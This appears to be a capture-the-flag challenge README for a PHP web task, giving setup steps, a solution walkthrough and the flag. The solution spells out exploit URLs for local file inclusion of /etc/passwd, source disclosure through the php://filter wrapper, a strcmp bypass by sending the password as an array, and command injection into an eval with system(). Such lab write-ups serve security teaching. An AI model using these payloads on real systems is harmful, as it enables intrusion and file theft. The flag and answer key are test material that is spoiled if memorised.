## How to get GPA 4.0

Hard web php challenge

## Question Text
Do you want to know the secret to perfect grades in SP? If you do prove yourself worthy!
Find my flag its somewhere there

## Setup Guide
1. Put the .php files and the passwd files in the /var/www/html
2. place the file in /var/gpa_secret folder to /var/gpa_secret(mkdir)  
3. set all excutables to permissions 111
Please note that php5 should be used with apache server

## How to Play
Obtain the flag from web page

## Solution
1. Click guess password button
2. URL will show play.spgame.site:10015/?include=secretstuff.php&passwd=
3. Delete off the passwd and try a local file inclusion play.spgame.site:10015/?include=/etc/passwd (should print it out)
4. Obtain php source play.spgame.site:10015/?include=php://filter/convert.base64-encode/resource=index.php (decode from base64)
5. Obtain secretstuff.php via the same method
6. In the secretstuff.php this was found `#my flag is somewhere in /var/gpa_secret/`
7. After getting the index.php source code a strcmp can be seen. This can be easily bypassed with play.spgame.site:10015/?include=secretstuff.php&passwd[]=anytexthere by adding straight brackets to passwd. passwd will be treated as a array, this will result in a strcmp bypass
8. After bypassing the password, we can see that there is another textbox asking to print the flag. Checking back to the source code will show that it runs an eval. Exploit it using remote code execution.
play.spgame.site:10015/?include=secretstuff.php&passwd[]=anytexthere&printer=someothertext;system("ls")
9. The directory should be shown of /var/www/html to obtain the flag play.spgame.site:10015/?include=secretstuff.php&passwd[]=anytexthere&printer=someothertext;system("ls /var/gpa_secret") a file called nottheflag can be seen
10. play.spgame.site:10015/?include=secretstuff.php&passwd[]=anytexthere&printer=someothertext;system("/var/gpa_secret/nottheflag") will execute the file and print the flag

Flag is GCTF{L1573N_70_Y0UR_S1G_H34D_K3LV1N_4_GP4_4}
